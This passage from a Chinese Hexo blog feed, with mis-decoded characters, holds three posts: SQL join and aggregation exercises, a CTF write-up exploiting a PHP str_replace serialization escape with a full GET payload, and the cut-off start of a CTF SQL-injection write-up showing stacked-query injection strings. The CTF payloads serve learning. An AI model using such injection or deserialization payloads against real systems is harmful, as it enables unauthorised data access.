      <url>/2023/10/12/%E4%B8%AD%E7%BA%A7-SQL-%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="å¸¸ç”¨çš„-SQL-å‘½ä»¤"><a href="#å¸¸ç”¨çš„-SQL-å‘½ä»¤" class="headerlink" title="å¸¸ç”¨çš„ SQL å‘½ä»¤"></a>å¸¸ç”¨çš„ SQL å‘½ä»¤</h2><p>åŸºæœ¬æ€è·¯ï¼š</p><p>JOIN åš å…³è”æŸ¥è¯¢ï¼ŒWHERE åšæ¡ä»¶é™åˆ¶ï¼Œå‡½æ•°åšè®¡ç®—ã€‚</p><p>æŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„å¹³å‡å¹´é¾„</p><p>ä½¿ç”¨ AVG å‡½æ•°æ¥æ±‚å‡å€¼ï¼ŒJOIN è¡¨åŠ æ¡ä»¶ï¼ŒGROUP BY æ¥æŒ‰éƒ¨é—¨å±•ç¤º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> éƒ¨é—¨ä¿¡æ¯.éƒ¨é—¨ç¼–å·,éƒ¨é—¨ä¿¡æ¯.éƒ¨é—¨åç§°,</span><br><span class="line">    <span class="built_in">AVG</span>(å‘˜å·¥ä¿¡æ¯.å¹´é¾„) <span class="keyword">AS</span> å¹³å‡å¹´é¾„</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">    å‘˜å·¥ä¿¡æ¯</span><br><span class="line"><span class="keyword">JOIN</span></span><br><span class="line">    éƒ¨é—¨ä¿¡æ¯ <span class="keyword">ON</span> å‘˜å·¥ä¿¡æ¯.æ‰€åœ¨éƒ¨é—¨ <span class="operator">=</span> éƒ¨é—¨ä¿¡æ¯.éƒ¨é—¨ç¼–å·</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">    éƒ¨é—¨ä¿¡æ¯.éƒ¨é—¨ç¼–å·, éƒ¨é—¨ä¿¡æ¯.éƒ¨é—¨åç§°;</span><br></pre></td></tr></table></figure><p>mitmproxy</p><p>æŸ¥è¯¢å’Œææ–‡èŒä¸åœ¨ä¸€ä¸ªéƒ¨é—¨çš„å‘˜å·¥</p><p>å±•ç¤ºé™¤äº†ç‰¹å®šå€¼ä»¥å¤–æ•°æ®ï¼Œä½¿ç”¨    ï¼&#x3D;    æ¥é™åˆ¶ï¼Œå…ˆåœ¨éƒ¨é—¨è¡¨å°†å’Œææ–‡èŒä¸åœ¨ä¸€ä¸ªéƒ¨é—¨çš„å‘˜å·¥ç»™é€‰æ‹©å‡ºæ¥ï¼Œå†é€šè¿‡å…³è”æŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> å‘˜å·¥å§“å</span><br><span class="line"><span class="keyword">FROM</span> å‘˜å·¥ä¿¡æ¯</span><br><span class="line"><span class="keyword">WHERE</span> æ‰€åœ¨éƒ¨é—¨ <span class="operator">!=</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> æ‰€åœ¨éƒ¨é—¨</span><br><span class="line">    <span class="keyword">FROM</span> å‘˜å·¥ä¿¡æ¯</span><br><span class="line">    <span class="keyword">WHERE</span> å‘˜å·¥å§“å <span class="operator">=</span> <span class="string">&#x27;ææ–‡èŒ&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">AND</span> å‘˜å·¥å§“å <span class="operator">!=</span> <span class="string">&#x27;ææ–‡èŒ&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢æ¯ä¸ªå‘˜å·¥çš„å·¥å·ï¼Œå§“åï¼Œæ‰€åœ¨éƒ¨é—¨åç§°ï¼Œä»¥åŠå…¶éƒ¨é—¨é¢†å¯¼å§“å</p><p>ç”¨è‡ªè¿æ¥æŸ¥è¯¢ï¼ŒåƒåŠ å…¥å…¶ä»–è¡¨ä¸€æ ·åŠ å…¥è‡ªå·±çš„ä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    e.å‘˜å·¥å·¥å·,</span><br><span class="line">    e.å‘˜å·¥å§“å,</span><br><span class="line">    d.éƒ¨é—¨åç§°,</span><br><span class="line">    l.å‘˜å·¥å§“å <span class="keyword">AS</span> éƒ¨é—¨é¢†å¯¼å§“å</span><br><span class="line"><span class="keyword">FROM</span> å‘˜å·¥ä¿¡æ¯ <span class="keyword">AS</span> e</span><br><span class="line"><span class="keyword">JOIN</span> éƒ¨é—¨ä¿¡æ¯ <span class="keyword">AS</span> d <span class="keyword">ON</span> e.æ‰€åœ¨éƒ¨é—¨ <span class="operator">=</span> d.éƒ¨é—¨ç¼–å·</span><br><span class="line"><span class="keyword">JOIN</span> å‘˜å·¥ä¿¡æ¯ <span class="keyword">AS</span> l <span class="keyword">ON</span> d.éƒ¨é—¨é¢†å¯¼å·¥å· <span class="operator">=</span> l.å‘˜å·¥å·¥å·;</span><br></pre></td></tr></table></figure><p>æ‰¾å‡ºå“ªä¸ªéƒ¨é—¨æ²¡æœ‰å‘˜å·¥ï¼Ÿ</p><p>ç”¨ IS NULL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> d.éƒ¨é—¨ç¼–å·, d.éƒ¨é—¨åç§°</span><br><span class="line"><span class="keyword">FROM</span> éƒ¨é—¨ä¿¡æ¯ <span class="keyword">AS</span> d</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> å‘˜å·¥ä¿¡æ¯ <span class="keyword">AS</span> e <span class="keyword">ON</span> d.éƒ¨é—¨ç¼–å· <span class="operator">=</span> e.æ‰€åœ¨éƒ¨é—¨</span><br><span class="line"><span class="keyword">WHERE</span> e.å‘˜å·¥å·¥å· <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢åœ¨ç¬¬5å­¦æœŸé€‰ä¿®äº†â€œæ•°æ®åº“ç³»ç»ŸåŸç†â€å’Œâ€œè½¯ä»¶å·¥ç¨‹å¯¼è®ºâ€è¿™ä¸¤é—¨è¯¾ç¨‹çš„å­¦ç”Ÿå­¦å·ã€å­¦ç”Ÿå§“åã€æ‰€åœ¨ä¸“ä¸šåç§°ã€‚</p><p>è¿™é‡Œç”¨ AND é“¾æ¥åšæ¡ä»¶é™åˆ¶</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.student_id, s.student_name, m.major_name</span><br><span class="line"><span class="keyword">FROM</span> students_info s</span><br><span class="line"><span class="keyword">JOIN</span> grades_info g1 <span class="keyword">ON</span> s.student_id <span class="operator">=</span> g1.student_id</span><br><span class="line"><span class="keyword">JOIN</span> grades_info g2 <span class="keyword">ON</span> s.student_id <span class="operator">=</span> g2.student_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info c1 <span class="keyword">ON</span> g1.course_id <span class="operator">=</span> c1.course_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info c2 <span class="keyword">ON</span> g2.course_id <span class="operator">=</span> c2.course_id</span><br><span class="line"><span class="keyword">JOIN</span> major_info m <span class="keyword">ON</span> s.major_id <span class="operator">=</span> m.major_id</span><br><span class="line"><span class="keyword">WHERE</span> c1.course_name <span class="operator">=</span> <span class="string">&#x27;æ•°æ®åº“åŸç†&#x27;</span> <span class="keyword">AND</span> c1.course_term <span class="operator">=</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">AND</span> c2.course_name <span class="operator">=</span> <span class="string">&#x27;è½¯ä»¶å·¥ç¨‹&#x27;</span> <span class="keyword">AND</span> c2.course_term <span class="operator">=</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢åœ¨é€‰ä¿®äº†â€œæ•°æ®åº“ç³»ç»ŸåŸç†â€å’Œâ€œè½¯ä»¶å·¥ç¨‹å¯¼è®ºâ€è¿™ä¸¤é—¨è¯¾ç¨‹çš„å­¦ç”Ÿå­¦å·ã€å­¦ç”Ÿå§“åã€ä»¥åŠå„ç§‘è¯¾ç¨‹çš„æˆç»©ã€‚</p><p>å¦‚ä½•æ‹†è§£ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆè€ƒè™‘æ¡ä»¶ï¼šâ€œé€‰ä¿®äº†â€œæ•°æ®åº“ç³»ç»ŸåŸç†â€å’Œâ€œè½¯ä»¶å·¥ç¨‹å¯¼è®ºâ€è¿™ä¸¤é—¨è¯¾ç¨‹çš„å­¦ç”Ÿâ€ï¼Œå…ˆç”¨ WHERE è¯­å¥æŒ‰ç…§æ¡ä»¶æŸ¥è¯¢å‡ºæ¥ï¼Œç„¶åå†å» JOIN å…¶ä»–è¡¨å±•ç¤ºå‰©ä¸‹çš„æ•°æ®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    s.student_id, </span><br><span class="line">    s.student_name,</span><br><span class="line">    c.course_name,</span><br><span class="line">    g.grades</span><br><span class="line"><span class="keyword">FROM</span> students_info s</span><br><span class="line"><span class="keyword">JOIN</span> grades_info g <span class="keyword">ON</span> s.student_id <span class="operator">=</span> g.student_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info c <span class="keyword">ON</span> g.course_id <span class="operator">=</span> c.course_id</span><br><span class="line"><span class="keyword">WHERE</span> s.student_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> student_id</span><br><span class="line">    <span class="keyword">FROM</span> grades_info</span><br><span class="line">    <span class="keyword">JOIN</span> courses_info <span class="keyword">ON</span> grades_info.course_id <span class="operator">=</span> courses_info.course_id</span><br><span class="line">    <span class="keyword">WHERE</span> course_name <span class="operator">=</span> <span class="string">&#x27;æ•°æ®åº“åŸç†&#x27;</span></span><br><span class="line">) <span class="keyword">AND</span> s.student_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> student_id</span><br><span class="line">    <span class="keyword">FROM</span> grades_info</span><br><span class="line">    <span class="keyword">JOIN</span> courses_info <span class="keyword">ON</span> grades_info.course_id <span class="operator">=</span> courses_info.course_id</span><br><span class="line">    <span class="keyword">WHERE</span> course_name <span class="operator">=</span> <span class="string">&#x27;è½¯ä»¶å·¥ç¨‹&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>æ±‚å‡ºæ¯é—¨è¯¾çš„è¯¾ç¨‹å·ã€é€‰è¯¾äººæ•°ã€‚</p><p>ç”¨ COUNT å»ç»Ÿè®¡ï¼Œè¿™é‡Œä½¿ç”¨å·¦é“¾æ¥æ˜¾ç¤ºæ²¡æœ‰äººé€‰çš„ç§‘ç›®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    c.course_id,</span><br><span class="line">    c.course_name,</span><br><span class="line">    <span class="built_in">COUNT</span>(g.student_id) <span class="keyword">AS</span> number_of_students</span><br><span class="line"><span class="keyword">FROM</span> courses_info c</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> grades_info g <span class="keyword">ON</span> c.course_id <span class="operator">=</span> g.course_id</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> c.course_id, c.course_name;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢æ‰€æœ‰å­¦ç”Ÿçš„é€‰ä¿®è¯¾ç¨‹æƒ…å†µå’Œæˆç»©ï¼Œè‹¥å­¦ç”Ÿæ²¡æœ‰é€‰ä¿®ä»»ä½•è¯¾ç¨‹ï¼Œä¹Ÿè¦åŒ…å«åœ¨å…¶ä¸­ã€‚</p><p>ä¹Ÿæ˜¯å·¦é“¾æ¥ï¼ŒåŒç†ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    c.course_id,</span><br><span class="line">    c.course_name,</span><br><span class="line">    s.student_id,</span><br><span class="line">    s.student_name</span><br><span class="line"><span class="keyword">FROM</span> grades_info g</span><br><span class="line"><span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> courses_info c <span class="keyword">ON</span> g.course_id <span class="operator">=</span> c.course_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> students_info s <span class="keyword">ON</span> g.student_id <span class="operator">=</span> s.student_id</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢è¢«é€‰ä¿®äº†çš„è¯¾ç¨‹çš„é€‰ä¿®æƒ…å†µå’Œæ‰€æœ‰å¼€è®¾è¯¾ç¨‹åï¼ŒåŒ…æ‹¬æ²¡æœ‰è¢«é€‰ä¿®çš„è¯¾ç¨‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    c.course_name,</span><br><span class="line">    GROUP_CONCAT(s.student_name) <span class="keyword">AS</span> students_enrolled</span><br><span class="line"><span class="keyword">FROM</span> courses_info c</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> grades_info g <span class="keyword">ON</span> c.course_id <span class="operator">=</span> g.course_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> students_info s <span class="keyword">ON</span> g.student_id <span class="operator">=</span> s.student_id</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> c.course_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> c.course_name;</span><br></pre></td></tr></table></figure><p>åœ¨å­¦ç”Ÿä¿¡æ¯è¡¨ä¸­ï¼ŒæŸ¥è¯¢å¹´é¾„æ¯”â€œç‹æ—â€å¤§çš„å­¦ç”Ÿçš„å­¦å·ï¼Œå§“åï¼Œå¹´é¾„</p><p>ç”¨ YEAR()å‡½æ•°è½¬æ¢ä¸º int å†ç›¸å‡</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    s1.student_id,</span><br><span class="line">    s1.student_name,</span><br><span class="line">    <span class="keyword">YEAR</span>(<span class="built_in">CURRENT_DATE</span>) <span class="operator">-</span> <span class="keyword">YEAR</span>(s1.birthday) <span class="keyword">AS</span> age</span><br><span class="line"><span class="keyword">FROM</span> students_info s1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> students_info s2 <span class="keyword">ON</span> s1.student_id <span class="operator">!=</span> s2.student_id</span><br><span class="line"><span class="keyword">WHERE</span> s2.student_name <span class="operator">=</span> <span class="string">&#x27;ç‹æ—&#x27;</span> <span class="keyword">AND</span> s1.birthday <span class="operator">&gt;</span> s2.birthday</span><br></pre></td></tr></table></figure><p>å°†â€œstudent_view3â€è§†å›¾çš„å†…å®¹ä¿®æ”¹ä¸ºï¼šâ€œæ•°æ®åº“ç³»ç»ŸåŸç†â€è¯¾ç¨‹æ‰€é€‰ä¿®å­¦ç”Ÿçš„ä¸“ä¸šåç§°å’Œå„ä¸ªä¸“ä¸šçš„é€‰è¯¾å­¦ç”Ÿäººæ•°</p><p>è¿™é‡Œç”¨ CREATE OR REPLACE ä¿®æ”¹è§†å›¾ï¼Œç„¶å FROM è¿™è¾¹å¯ä»¥ä»ä¸€ä¸ªæŸ¥è¯¢ç»“æœé‡Œçš„è¡¨é€‰å–ï¼Œç”¨ AS t é‡æ–°å‘½åä¸º tï¼Œè¿™é‡Œå°±å¯ä»¥ä½“ç°å‡ºæ•°æ®åº“æŸ¥è¯¢æ€è·¯äº†ï¼Œç”±ç®€å•å†åˆ°å¤æ‚ï¼Œå°†å¤æ‚çš„è¯­å¥æ‹†å¼€æˆå‡ ä¸ªéƒ¨åˆ†ï¼Œå®ç°äº†å„ä¸ªéƒ¨åˆ†å†åˆå¹¶ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">VIEW</span> student_view3 <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> t.major_name,<span class="built_in">COUNT</span>(t.student_id) <span class="keyword">AS</span> numbers</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">(<span class="keyword">SELECT</span> m.major_name, s.student_id</span><br><span class="line"><span class="keyword">FROM</span> students_info <span class="keyword">AS</span> s</span><br><span class="line"><span class="keyword">JOIN</span> major_info <span class="keyword">AS</span> m <span class="keyword">ON</span> s.major_id <span class="operator">=</span> m.major_id) <span class="keyword">AS</span> t</span><br><span class="line"><span class="keyword">JOIN</span> grades_info <span class="keyword">AS</span> g <span class="keyword">ON</span> t.student_id <span class="operator">=</span> g.student_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info <span class="keyword">AS</span> c <span class="keyword">ON</span> c.course_id <span class="operator">=</span> g.course_id</span><br><span class="line"><span class="keyword">WHERE</span> c.course_name <span class="operator">=</span> &quot;æ•°æ®åº“åŸç†&quot;</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> t.major_name;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“åŸºç¡€ </category>
          
          <category> SQLå®è·µéƒ¨åˆ† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æœˆé¥¼æ¯ã€‘Serialize - str_replaceå­—ç¬¦é€ƒé€¸</title>
      <link href="/2023/10/08/Serialize-%E6%B3%A8%E5%85%A5-str-replace%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2023/10/08/Serialize-%E6%B3%A8%E5%85%A5-str-replace%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Serialize-æ³¨å…¥-str-replaceæ¼æ´åˆ©ç”¨"><a href="#Serialize-æ³¨å…¥-str-replaceæ¼æ´åˆ©ç”¨" class="headerlink" title="Serialize æ³¨å…¥ - str_replaceæ¼æ´åˆ©ç”¨"></a>Serialize æ³¨å…¥ - str_replaceæ¼æ´åˆ©ç”¨</h1><p>é¢˜ç›®æ¥è‡ªæœˆé¥¼æ¯ web1_æ­¤å¤œåœ†<br>é¢˜ç›®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span></span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__construct</span>(<span class="params">$uname,$password</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname=$uname;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">if</span>($this-&gt;password===<span class="string">&#x27;yu22x&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                echo <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">filter</span>(<span class="params">$string</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">str_replace</span>(<span class="string">&#x27;Firebasky&#x27;</span>,<span class="string">&#x27;Firebaskyup&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=<span class="title function_">filter</span>(<span class="title function_">serialize</span>(<span class="keyword">new</span> <span class="title function_">a</span>($uname,$password)));</span><br><span class="line">$test=<span class="title function_">unserialize</span>($ser);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å‘ç°__wakeup()å‡½æ•°é‡Œæ‰æœ‰è·å–åˆ° flag çš„å‡½æ•°ï¼Œä¸èƒ½ç»•è¿‡ï¼Œè¿™é‡Œåªæœ‰ä¸€ä¸ª GET ä¿®æ”¹ unameï¼Œè¯´æ˜å°±æ˜¯è¦åœ¨ serialize é‡Œè¦†ç›– password æ¥è·å–åˆ° flagã€‚<br>çœ‹åˆ°æœ‰ä¸€ä¸ª filter å‡½æ•°ä¼šå¥—åœ¨ serialize å‡½æ•°å¤–é¢ï¼Œè¿™ç§æ ¼å¼ä¼šå¯¼è‡´åºåˆ—åŒ–åå­—ç¬¦ä¸ªæ•°ä¸åŒ¹é…ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œä»–ä¼šæŒ‰ç…§å­—ç¬¦ä¸ªæ•°å»åŒ¹é…å‚æ•°å†…å®¹ï¼Œå¦‚æœä¸åŒ¹é…é‚£ä¹ˆ wakeup å‡½æ•°å°±ä¼šå¤±æ•ˆï¼Œè¯¥å‚æ•°ä¹Ÿä¼šæ¸…ç©ºï¼Œè¿™é‡Œæ¯å‡ºç°ä¸€ä¸ªFirebaskyå°±ä¼šå¤šä¸¤ä¸ªå­—ç¬¦ï¼Œè¿™æ ·çš„è¯å°±å…è®¸æˆ‘ä»¬æ¨¡ä»¿åºåˆ—åŒ–åçš„æ ¼å¼å»å®šä¹‰ password æ¥è¦†ç›–æ‰åé¢çš„ passwordï¼Œæ„é€  password ä¼šå¤šä¸‹é¢è¿™ä¸€éƒ¨åˆ†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè®°å¾—ç”¨ <strong>;}â€</strong> æ¥ç»“æŸç»“æ„ï¼Œè®©åé¢çš„ password æ— æ•ˆã€‚<br>ä¸€å…±å¤šäº† 30 ä¸ªå­—ç¬¦ï¼Œåˆšå¥½æ˜¯å¶æ•°ï¼Œæˆ‘ä»¬åœ¨ uname é‡Œå¡«å…¥ 15 ä¸ªFirebaskyï¼Œå¤šå‡ºæ¥çš„ 15 ä¸ª up å°±åˆšåˆšå¥½æŠŠè¿™éƒ¨åˆ†æ©ç›–æ‰ï¼Œæ•…æ„é€  payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; </span><br></pre></td></tr></table></figure><p>å³å¯è·å¾— flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> å­—ç¬¦é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ”»é˜²ä¸–ç•Œã€‘mysql æ³¨å…¥ 1</title>
      <link href="/2023/09/19/mysql-inject1/"/>
      <url>/2023/09/19/mysql-inject1/</url>
      
        <content type="html"><![CDATA[<h3 id="SQLæ³¨å…¥-æ›´æ”¹è¡¨"><a href="#SQLæ³¨å…¥-æ›´æ”¹è¡¨" class="headerlink" title="SQLæ³¨å…¥-æ›´æ”¹è¡¨"></a>SQLæ³¨å…¥-æ›´æ”¹è¡¨</h3><p>æ‰“å¼€é¢˜ç›®ï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼š<br><img src="/2023/09/19/mysql-inject1/image1.jpg"><br>çŒœæµ‹æ˜¯è€ƒå¯Ÿ sql æ³¨å…¥ï¼Œæˆ‘ä»¬è¾“å…¥1â€™æŸ¥çœ‹æ˜¯å¦æœ‰æ³¨å…¥æœºä¼šï¼š<br><img src="/2023/09/19/mysql-inject1/image2.jpg"><br>å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŸ¥çœ‹èƒ½åœ¨è¿™ä¸ªæ•°æ®åº“ä¸­è·å–åˆ°ä»€ä¹ˆä¿¡æ¯ï¼Œæ‰§è¡Œè¯­å¥ï¼š<br>â€œ1â€™;show tables #â€<br>è¿™é‡Œçš„ç”¨å•å¼•å·å°†æŸ¥è¯¢è¯­å¥ç»“æŸï¼Œå¹¶ç”¨#æ³¨é‡Šæ‰åé¢çš„å¼•å·é˜²æ­¢æŠ¥é”™ï¼Œè¿™é‡Œçš„ show databases å°±ä¼šæ‰§è¡Œäº†ã€‚<br><img src="/2023/09/19/mysql-inject1/image3.jpg"><br>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªè¡¨ï¼Œâ€1919810931114514â€å’Œâ€œwordsâ€ï¼Œæˆ‘ä»¬å…ˆè¯•ä¸€ä¸‹èƒ½ä¸èƒ½ç›´æ¥æŸ¥è¯¢è¡¨ï¼Œä½¿ç”¨ï¼š<br>â€œ1â€™;select * from `1919810931114514` # å‘ç°ï¼š<br><img src="/2023/09/19/mysql-inject1/image4.jpg"><br>ç¦ç”¨äº†ä»¥ä¸Šè¯­å¥ï¼Œé‚£æˆ‘ä»¬å°±è¦æƒ³åŠæ³•æ€ä¹ˆæ‹¿åˆ°ä¿¡æ¯äº†ï¼Œæˆ‘ä»¬çœ‹åˆ°çª—å£æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½å¤šåŠæ˜¯æŸ¥è¯¢è¯­å¥æ„é€ 1â€™ or 1&#x3D;1 #æŸ¥è¯¢è¡¨å†…æ‰€æœ‰å†…å®¹ï¼Œæ²¡æœ‰å‘ç° 